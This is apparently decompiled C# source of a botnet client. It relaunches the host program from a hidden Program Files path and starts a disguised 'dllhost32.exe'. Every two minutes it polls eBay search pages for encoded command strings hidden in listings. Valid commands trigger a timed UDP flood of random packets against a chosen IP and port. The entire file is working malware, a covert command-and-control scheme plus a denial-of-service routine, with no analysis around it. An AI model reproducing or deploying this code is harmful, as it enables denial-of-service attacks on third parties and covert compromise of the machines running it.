using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;

internal class dll6wise
{
	private class CodeNumber
	{
		public int[] DigitInts;

		public CodeNumber(params int[] SuppliedDigitInts)
		{
			DigitInts = SuppliedDigitInts;
		}
	}

	private class ExecuteCommandCaller
	{
		private int[] MyCodeInts;

		public ExecuteCommandCaller(int[] TheSuppliedCode)
		{
			MyCodeInts = TheSuppliedCode;
		}

		public void CallExecuteCommand()
		{
			ExecuteCommand(MyCodeInts);
		}
	}

	private const int UDPActionSumInt = 78;

	private const int ValidationSumInt = 281;

	private static Random TheRandom = new Random();

	private static DirectoryInfo ProgramFilesDirectoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));

	private static string MyUserAgentString = "Mozilla/4.0 Client";

	private static string TheHeaderString = "table";

	private static int TheCodeLengthInt = 128;

	private static int[] ValidationPositionInts = new int[42]
	{
		56, 12, 82, 19, 94, 77, 32, 102, 55, 65,
		91, 95, 87, 86, 33, 39, 50, 72, 61, 98,
		11, 126, 52, 28, 29, 75, 127, 107, 121, 60,
		68, 80, 15, 88, 46, 17, 109, 49, 85, 23,
		116, 10
	};

	private static int[,] YearPositionInts = new int[2, 2]
	{
		{ 27, 20 },
		{ 35, 3 }
	};

	private static int[,] MonthPositionInts = new int[2, 2]
	{
		{ 40, 125 },
		{ 104, 44 }
	};

	private static int[,] DayPositionInts = new int[2, 2]
	{
		{ 67, 2 },
		{ 113, 22 }
	};

	private static int[,] HourPositionInts = new int[2, 2]
	{
		{ 38, 112 },
		{ 115, 42 }
	};

	private static int[,] MinutePositionInts = new int[2, 2]
	{
		{ 0, 26 },
		{ 58, 31 }
	};

	private static int[,] SecondPositionInts = new int[2, 2]
	{
		{ 124, 66 },
		{ 103, 1 }
	};

	private static int[,] ActionPositionInts = new int[2, 2]
	{
		{ 105, 57 },
		{ 117, 120 }
	};

	private static int[,] UDPParamPositionInts = new int[29, 2]
	{
		{ 73, 25 },
		{ 8, 114 },
		{ 74, 76 },
		{ 81, 6 },
		{ 71, 24 },
		{ 7, 84 },
		{ 93, 34 },
		{ 83, 37 },
		{ 110, 43 },
		{ 18, 70 },
		{ 48, 13 },
		{ 14, 101 },
		{ 47, 69 },
		{ 92, 4 },
		{ 100, 53 },
		{ 51, 123 },
		{ 119, 122 },
		{ 99, 41 },
		{ 54, 30 },
		{ 111, 21 },
		{ 97, 79 },
		{ 96, 45 },
		{ 78, 5 },
		{ 16, 108 },
		{ 106, 62 },
		{ 118, 36 },
		{ 89, 59 },
		{ 9, 63 },
		{ 90, 64 }
	};

	private static int[] UDPTargetIPStringInts = new int[4];

	private static string UDPTargetIPString;

	private static int UDPTargetPortInt;

	private static int UDPDelayBetweenPacketsInt;

	private static int UDPMinutesTillExpirationInt;

	private static bool MayContinueRoutineBool = true;

	private static ArrayList TheThreadsArrayList = new ArrayList();

	private static DateTime GetOfficialDateTime()
	{
		string hostname = "time.nist.gov";
		int port = 13;
		try
		{
			TcpClient tcpClient = new TcpClient();
			tcpClient.Connect(hostname, port);
			NetworkStream stream = tcpClient.GetStream();
			string text;
			if (stream.CanWrite && stream.CanRead)
			{
				byte[] bytes = Encoding.ASCII.GetBytes("00");
				stream.Write(bytes, 0, bytes.Length);
				byte[] array = new byte[tcpClient.ReceiveBufferSize];
				stream.Read(array, 0, tcpClient.ReceiveBufferSize);
				text = Encoding.ASCII.GetString(array);
			}
			else
			{
				text = "";
			}
			tcpClient.Close();
			string[] array2 = text.Split(new char[1] { ' ' });
			string[] array3 = array2[1].Split(new char[1] { '-' });
			string[] array4 = array2[2].Split(new char[1] { ':' });
			return new DateTime(int.Parse(array3[0]) + 2000, int.Parse(array3[1]), int.Parse(array3[2]), int.Parse(array4[0]), int.Parse(array4[1]), int.Parse(array4[2]));
		}
		catch (Exception)
		{
			return DateTime.UtcNow;
		}
	}

	private static string GetEbayPage(string ThePageName)
	{
		string requestUriString = "http://search.ebay.com/" + ThePageName;
		string text;
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
			httpWebRequest.UserAgent = MyUserAgentString;
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			Stream responseStream = httpWebResponse.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			text = streamReader.ReadToEnd();
			streamReader.Close();
			responseStream.Close();
			httpWebResponse.Close();
			httpWebRequest.Abort();
		}
		catch (Exception)
		{
			return "";
		}
		if (text.Contains("itemlistcontrols"))
		{
			text = text.Substring(text.IndexOf("itemlistcontrols"));
		}
		else if (text.Contains("arrow_small"))
		{
			text = text.Substring(text.IndexOf("arrow_small"));
		}
		else if (text.Contains("List View"))
		{
			text = text.Substring(text.IndexOf("List View"));
		}
		if (text.Contains("CompareShop"))
		{
			text = text.Substring(0, text.IndexOf("CompareShop"));
		}
		else if (text.Contains("end_small"))
		{
			text = text.Substring(text.IndexOf("end_small"));
		}
		else if (text.Contains("select the check"))
		{
			text = text.Substring(text.IndexOf("select the check"));
		}
		ArrayList arrayList = new ArrayList();
		string value = "";
		string text2 = "";
		string text3 = "href=\"";
		bool flag = true;
		while (flag)
		{
			if (text.Contains(text3))
			{
				text = text.Substring(text.IndexOf(text3) + text3.Length);
				text2 = text.Substring(0, text.IndexOf("\""));
				if (!text2.Equals(value))
				{
					arrayList.Add(text2);
				}
				value = text2;
				text = text.Substring(1);
			}
			else
			{
				flag = false;
			}
		}
		StringBuilder stringBuilder = new StringBuilder("");
		foreach (string item in arrayList)
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(item);
				httpWebRequest.UserAgent = MyUserAgentString;
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Stream responseStream = httpWebResponse.GetResponseStream();
				StreamReader streamReader = new StreamReader(responseStream);
				text = streamReader.ReadToEnd();
				streamReader.Close();
				responseStream.Close();
				httpWebResponse.Close();
				httpWebRequest.Abort();
				stringBuilder.Append(text);
			}
			catch (Exception)
			{
			}
		}
		return stringBuilder.ToString();
	}

	private static ArrayList ScanForCommandCodes(string TheSuppliedString)
	{
		ArrayList arrayList = new ArrayList();
		bool flag = true;
		while (flag)
		{
			if (TheSuppliedString.Contains(TheHeaderString))
			{
				TheSuppliedString = TheSuppliedString.Substring(TheSuppliedString.IndexOf(TheHeaderString));
				if (TheSuppliedString.Length >= TheCodeLengthInt)
				{
					char[] array = TheSuppliedString.Substring(TheHeaderString.Length, TheCodeLengthInt).ToCharArray();
					int[] array2 = new int[array.Length];
					for (int i = 0; i < array2.Length; i++)
					{
						array2[i] = array[i] - 48;
					}
					if (!DecryptCommand(array2).Equals("invalid"))
					{
						arrayList.Add(array2);
					}
					TheSuppliedString = TheSuppliedString.Substring(1);
				}
				else
				{
					flag = false;
				}
			}
			else
			{
				flag = false;
			}
		}
		return arrayList;
	}

	private static int[] AddEncryptedNumber(int[] TheSuppliedCodeInts, CodeNumber TheCodeNumber, int[,] PartsPositionsInts)
	{
		for (int i = 0; i < TheCodeNumber.DigitInts.Length; i++)
		{
			int num = TheCodeNumber.DigitInts[i];
			int num2 = TheRandom.Next(num);
			num -= num2;
			TheSuppliedCodeInts[PartsPositionsInts[i, 0]] = num2;
			TheSuppliedCodeInts[PartsPositionsInts[i, 1]] = num;
		}
		return TheSuppliedCodeInts;
	}

	private static CodeNumber SplitDigits(int SuppliedTwoDigitInt)
	{
		int[] array = new int[2];
		int num = SuppliedTwoDigitInt / 10;
		int num2 = SuppliedTwoDigitInt - num * 10;
		array[0] = num;
		array[1] = num2;
		return new CodeNumber(array);
	}

	private static int[] EncryptCommand(DateTime TheDateTime, string TheActionString, params int[] TheParamInts)
	{
		int[] array = new int[128];
		for (int i = 0; i < 281; i++)
		{
			int num = TheRandom.Next(ValidationPositionInts.Length);
			array[ValidationPositionInts[num]]++;
			if (array[ValidationPositionInts[num]] > 9)
			{
				array[ValidationPositionInts[num]]--;
				i--;
			}
		}
		array = AddEncryptedNumber(array, SplitDigits(TheDateTime.Year - 2000), YearPositionInts);
		array = AddEncryptedNumber(array, SplitDigits(TheDateTime.Month), MonthPositionInts);
		array = AddEncryptedNumber(array, SplitDigits(TheDateTime.Day), DayPositionInts);
		array = AddEncryptedNumber(array, SplitDigits(TheDateTime.Hour), HourPositionInts);
		array = AddEncryptedNumber(array, SplitDigits(TheDateTime.Minute), MinutePositionInts);
		array = AddEncryptedNumber(array, SplitDigits(TheDateTime.Second), SecondPositionInts);
		if (TheActionString != null && TheActionString == "UDP")
		{
			array = AddEncryptedNumber(array, SplitDigits(78), ActionPositionInts);
			int[,] array2 = new int[1, 2];
			int[,] array3 = array2;
			for (int i = 0; i < UDPParamPositionInts.GetLength(0); i++)
			{
				for (int j = 0; j < UDPParamPositionInts.GetLength(1); j++)
				{
					array3[0, j] = UDPParamPositionInts[i, j];
				}
				array = AddEncryptedNumber(array, new CodeNumber(TheParamInts[i]), array3);
			}
		}
		return array;
	}

	private static string DecryptCommand(int[] TheSuppliedCodeInts)
	{
		string text = "";
		int num = 0;
		int num2 = 0;
		bool flag = true;
		num = 0;
		int[] validationPositionInts = ValidationPositionInts;
		foreach (int num3 in validationPositionInts)
		{
			num += TheSuppliedCodeInts[num3];
		}
		if (num != 281)
		{
			flag = false;
		}
		if (flag)
		{
			for (int num3 = 0; num3 < MonthPositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < MonthPositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[MonthPositionInts[num3, j]];
				}
				text += num;
			}
			text += "/";
			for (int num3 = 0; num3 < DayPositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < DayPositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[DayPositionInts[num3, j]];
				}
				text += num;
			}
			text += "/";
			for (int num3 = 0; num3 < YearPositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < YearPositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[YearPositionInts[num3, j]];
				}
				text += num;
			}
			text += " ";
			for (int num3 = 0; num3 < HourPositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < HourPositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[HourPositionInts[num3, j]];
				}
				text += num;
			}
			text += ":";
			for (int num3 = 0; num3 < MinutePositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < MinutePositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[MinutePositionInts[num3, j]];
				}
				text += num;
			}
			text += ":";
			for (int num3 = 0; num3 < SecondPositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < SecondPositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[SecondPositionInts[num3, j]];
				}
				text += num;
			}
			text += " ";
		}
		if (flag)
		{
			num2 = 0;
			for (int num3 = 0; num3 < ActionPositionInts.GetLength(0); num3++)
			{
				num = 0;
				for (int j = 0; j < ActionPositionInts.GetLength(1); j++)
				{
					num += TheSuppliedCodeInts[ActionPositionInts[num3, j]];
				}
				num2 += num * (int)Math.Pow(10.0, ActionPositionInts.GetLength(0) - num3 - 1);
			}
			int num4 = num2;
			if (num4 != 78)
			{
				flag = false;
			}
			else
			{
				text += "UDP ";
				int[,] array = new int[1, 2];
				int[,] array2 = array;
				num2 = 0;
				for (int num3 = 0; num3 < UDPParamPositionInts.GetLength(0); num3++)
				{
					for (int j = 0; j < UDPParamPositionInts.GetLength(1); j++)
					{
						array2[0, j] = UDPParamPositionInts[num3, j];
					}
					num = 0;
					for (int j = 0; j < array2.GetLength(1); j++)
					{
						num += TheSuppliedCodeInts[array2[0, j]];
					}
					text = text + num + " ";
				}
			}
		}
		if (flag)
		{
			return text;
		}
		return "invalid";
	}

	private static void ExecuteCommand(int[] TheSuppliedCodeInts)
	{
		int num = 0;
		int num2 = 0;
		GetOfficialDateTime();
		bool flag = true;
		num = 0;
		int[] validationPositionInts = ValidationPositionInts;
		for (int i = 0; i < validationPositionInts.Length; i++)
		{
			int num3 = validationPositionInts[i];
			num += TheSuppliedCodeInts[num3];
		}
		if (num != 281)
		{
			flag = false;
		}
		if (!flag)
		{
			return;
		}
		num2 = 0;
		for (int num3 = 0; num3 < MonthPositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < MonthPositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[MonthPositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, MonthPositionInts.GetLength(0) - num3 - 1);
		}
		int month = num2;
		num2 = 0;
		for (int num3 = 0; num3 < DayPositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < DayPositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[DayPositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, DayPositionInts.GetLength(0) - num3 - 1);
		}
		int day = num2;
		num2 = 0;
		for (int num3 = 0; num3 < YearPositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < YearPositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[YearPositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, YearPositionInts.GetLength(0) - num3 - 1);
		}
		int year = num2 + 2000;
		num2 = 0;
		for (int num3 = 0; num3 < HourPositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < HourPositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[HourPositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, HourPositionInts.GetLength(0) - num3 - 1);
		}
		int hour = num2;
		num2 = 0;
		for (int num3 = 0; num3 < MinutePositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < MinutePositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[MinutePositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, MinutePositionInts.GetLength(0) - num3 - 1);
		}
		int minute = num2;
		num2 = 0;
		for (int num3 = 0; num3 < SecondPositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < SecondPositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[SecondPositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, SecondPositionInts.GetLength(0) - num3 - 1);
		}
		int second = num2;
		DateTime theCommandDateTime = new DateTime(year, month, day, hour, minute, second);
		num2 = 0;
		for (int num3 = 0; num3 < ActionPositionInts.GetLength(0); num3++)
		{
			num = 0;
			for (int j = 0; j < ActionPositionInts.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[ActionPositionInts[num3, j]];
			}
			num2 += num * (int)Math.Pow(10.0, ActionPositionInts.GetLength(0) - num3 - 1);
		}
		string text = "";
		ArrayList arrayList = new ArrayList();
		int num4 = num2;
		if (num4 != 78)
		{
			flag = false;
			return;
		}
		text = "UDP";
		int[,] array = new int[1, 2];
		int[,] array2 = array;
		num2 = 0;
		for (int num3 = 0; num3 < UDPParamPositionInts.GetLength(0); num3++)
		{
			for (int j = 0; j < UDPParamPositionInts.GetLength(1); j++)
			{
				array2[0, j] = UDPParamPositionInts[num3, j];
			}
			num = 0;
			for (int j = 0; j < array2.GetLength(1); j++)
			{
				num += TheSuppliedCodeInts[array2[0, j]];
			}
			arrayList.Add(num);
		}
		string text2 = text;
		if (text2 != null && text2 == "UDP")
		{
			DoUDPAttack(theCommandDateTime, arrayList);
		}
		else
		{
			flag = false;
		}
	}

	private static void SetUDPParams(ArrayList TheParamInts)
	{
		UDPTargetIPStringInts[0] = int.Parse(string.Concat("", TheParamInts[0], TheParamInts[1], TheParamInts[2]));
		UDPTargetIPStringInts[1] = int.Parse(string.Concat("", TheParamInts[3], TheParamInts[4], TheParamInts[5]));
		UDPTargetIPStringInts[2] = int.Parse(string.Concat("", TheParamInts[6], TheParamInts[7], TheParamInts[8]));
		UDPTargetIPStringInts[3] = int.Parse(string.Concat("", TheParamInts[9], TheParamInts[10], TheParamInts[11]));
		UDPTargetPortInt = int.Parse(string.Concat("", TheParamInts[12], TheParamInts[13], TheParamInts[14], TheParamInts[15], TheParamInts[16]));
		UDPDelayBetweenPacketsInt = int.Parse(string.Concat("", TheParamInts[17], TheParamInts[18], TheParamInts[19], TheParamInts[20], TheParamInts[21], TheParamInts[22]));
		UDPMinutesTillExpirationInt = int.Parse(string.Concat("", TheParamInts[23], TheParamInts[24], TheParamInts[25], TheParamInts[26], TheParamInts[27], TheParamInts[28]));
	}

	private static void SetTimerEnabledToTrue(object sender, ElapsedEventArgs e)
	{
		((System.Timers.Timer)sender).Enabled = true;
	}

	private static void SetTimerEnabledToFalse(object sender, ElapsedEventArgs e)
	{
		((System.Timers.Timer)sender).Enabled = false;
	}

	private static void DoUDPAttack(DateTime TheCommandDateTime, ArrayList TheParamInts)
	{
		SetUDPParams(TheParamInts);
		DateTime officialDateTime = GetOfficialDateTime();
		DateTime dateTime = TheCommandDateTime + new TimeSpan(0, UDPMinutesTillExpirationInt, 0);
		if (dateTime.CompareTo(officialDateTime) != 1 || officialDateTime.CompareTo(TheCommandDateTime) != 1)
		{
			return;
		}
		_ = officialDateTime - TheCommandDateTime;
		int num = (int)(dateTime - officialDateTime).TotalMinutes;
		System.Timers.Timer timer = new System.Timers.Timer(num * 60 * 1000);
		timer.Elapsed += SetTimerEnabledToFalse;
		timer.AutoReset = false;
		timer.Enabled = true;
		byte[] array = new byte[1024];
		while (timer.Enabled)
		{
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = (byte)TheRandom.Next(255);
			}
			UDPTargetIPString = "";
			for (int i = 0; i < UDPTargetIPStringInts.Length; i++)
			{
				if (UDPTargetIPStringInts[i] > 255)
				{
					UDPTargetIPString = UDPTargetIPString + "" + TheRandom.Next(255);
				}
				else
				{
					UDPTargetIPString = UDPTargetIPString + "" + UDPTargetIPStringInts[i];
				}
				UDPTargetIPString += ".";
			}
			UDPTargetIPString = UDPTargetIPString.Remove(UDPTargetIPString.Length - 1);
			try
			{
				UdpClient udpClient = ((UDPTargetPortInt <= 65535) ? new UdpClient(UDPTargetIPString, UDPTargetPortInt) : new UdpClient(UDPTargetIPString, TheRandom.Next(65535)));
				udpClient.Send(array, array.Length);
				Thread.Sleep(UDPDelayBetweenPacketsInt);
			}
			catch (Exception)
			{
			}
		}
	}

	public static void DoRoutine()
	{
		GetOfficialDateTime();
		ArrayList arrayList = ScanForCommandCodes(GetEbayPage("worthless"));
		ArrayList arrayList2 = new ArrayList();
		foreach (Thread theThreadsArray in TheThreadsArrayList)
		{
			theThreadsArray.Abort();
		}
		TheThreadsArrayList = new ArrayList();
		for (int i = 0; i < arrayList.Count; i++)
		{
			arrayList2.Add(new ExecuteCommandCaller((int[])arrayList[i]));
			TheThreadsArrayList.Add(new Thread(((ExecuteCommandCaller)arrayList2[i]).CallExecuteCommand));
		}
		foreach (Thread theThreadsArray2 in TheThreadsArrayList)
		{
			theThreadsArray2.Start();
		}
	}

	public static void OnExited(object sender, EventArgs e)
	{
		MayContinueRoutineBool = false;
	}

	public static void Main(string[] args)
	{
		string executablePath = Application.get_ExecutablePath();
		string[] array = executablePath.Split(new char[1] { '\\' });
		string text = "";
		for (int i = 0; i < array.Length - 1; i++)
		{
			text = text + array[i] + "\\";
		}
		text = text.Remove(text.Length - 1);
		string fileName = ProgramFilesDirectoryInfo.FullName + "\\Common\\Data\\" + executablePath.Replace(':', '_');
		Process process = new Process();
		try
		{
			process.StartInfo.FileName = fileName;
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.StartInfo.ErrorDialog = false;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.WorkingDirectory = text;
			process.EnableRaisingEvents = true;
			process.Exited += OnExited;
			process.StartInfo.Arguments = "";
			foreach (string text2 in args)
			{
				process.StartInfo.Arguments += text2;
			}
			process.Start();
		}
		catch (Exception)
		{
		}
		string fileName2 = ProgramFilesDirectoryInfo.FullName + "\\Common\\Resources\\dllhost32.exe";
		Process process2 = new Process();
		try
		{
			process2.StartInfo.FileName = fileName2;
			process2.StartInfo.ErrorDialog = false;
			process2.Start();
			try
			{
				process2.PriorityClass = ProcessPriorityClass.BelowNormal;
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
			fileName2 = ProgramFilesDirectoryInfo.FullName + "C:\\dllhost32.exe";
			process2 = new Process();
			try
			{
				process2.StartInfo.FileName = fileName2;
				process2.StartInfo.ErrorDialog = false;
				process2.Start();
				try
				{
					process2.PriorityClass = ProcessPriorityClass.BelowNormal;
				}
				catch (Exception)
				{
				}
			}
			catch (Exception)
			{
			}
		}
		while (MayContinueRoutineBool)
		{
			DoRoutine();
			Thread.Sleep(120000);
		}
	}
}
